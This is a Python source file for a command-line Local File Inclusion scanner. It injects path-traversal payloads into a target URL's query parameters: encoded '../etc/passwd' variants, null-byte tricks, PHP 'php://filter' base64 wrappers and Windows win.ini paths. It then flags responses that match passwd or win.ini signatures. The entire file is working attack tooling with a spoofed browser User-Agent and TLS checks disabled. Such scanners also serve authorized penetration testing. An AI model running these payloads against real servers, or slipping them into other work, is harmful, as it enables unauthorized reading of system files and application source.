"""
Local File Inclusion (LFI) scanner module.

Tests URL parameters with traversal payloads and checks responses for
signatures of sensitive local files (Unix /etc/passwd, Windows boot.ini,
PHP filter wrappers).
"""

from __future__ import annotations

import json
import base64
import re
from argparse import ArgumentParser
from typing import Any
from urllib.parse import urlparse, parse_qs, urlencode

import requests


PAYLOADS: tuple[str, ...] = (
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../index.php",
    "C:\\Windows\\win.ini",
    "../../../../windows/win.ini",
    "..\\..\\..\\windows\\win.ini",
)


SIGNATURES: tuple[tuple[str, str], ...] = (
    ("root:x:0:0", "unix /etc/passwd"),
    ("root:*:0:0", "unix /etc/passwd (bsd)"),
    ("daemon:x:1:1", "unix /etc/passwd"),
    ("[fonts]", "windows win.ini"),
    ("[extensions]", "windows win.ini"),
    ("for 16-bit app support", "windows win.ini"),
    ("[boot loader]", "windows boot.ini"),
)


BASE64_RE = re.compile(r"^[A-Za-z0-9+/=\s]+$")


class LFIScanner:
    """
    Local File Inclusion scanner.

    Example:
        l = LFIScanner("http://target/page.php?file=home")
        print(l.scan())
    """

    def __init__(self, url: str, timeout: float = 8.0, verify_ssl: bool = False) -> None:
        self.url = url
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0 Safari/537.36"
            )
        })
        self.session.verify = verify_ssl

    def _test(self, param: str, payload: str) -> tuple[str, str]:
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        r = self.session.get(test_url, timeout=self.timeout)
        return test_url, r.text

    @staticmethod
    def _decode_base64(body: str) -> str:
        stripped = "".join(body.split())
        if not BASE64_RE.match(stripped):
            return ""
        try:
            return base64.b64decode(stripped).decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def scan(self) -> list[dict[str, Any]]:
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        if not params:
            return [{"error": "no query parameters in URL"}]

        findings: list[dict[str, Any]] = []
        for param in params:
            for payload in PAYLOADS:
                try:
                    test_url, body = self._test(param, payload)
                except Exception:
                    continue

                decoded = self._decode_base64(body) if "filter" in payload else ""
                haystack = body if not decoded else decoded

                for sig, label in SIGNATURES:
                    if sig in haystack:
                        finding = {
                            "param": param,
                            "payload": payload,
                            "signature": sig,
                            "label": label,
                            "url": test_url,
                        }
                        findings.append(finding)
                        print(f"[!] LFI on '{param}' :: {payload}  ({label})")
                        break
        return findings

    def pretty(self, findings: list[dict[str, Any]]) -> str:
        bar = "=" * 56
        lines = [bar, f"  LFI Scan :: {self.url}",
                 f"  Hits: {len(findings)}", bar]
        for f in findings:
            if "error" in f:
                lines.append("  " + f["error"])
                continue
            lines.append(f"  param={f['param']}  ({f['label']})")
            lines.append(f"      payload: {f['payload']}")
        return "\n".join(lines)


def main() -> None:
    p = ArgumentParser(description="Local File Inclusion scanner")
    p.add_argument("url", help="target URL with query string")
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--json", action="store_true")
    args = p.parse_args()

    l = LFIScanner(args.url, timeout=args.timeout)
    findings = l.scan()

    if args.json:
        print(json.dumps(findings, indent=2))
    else:
        print(l.pretty(findings))


if __name__ == "__main__":
    main()
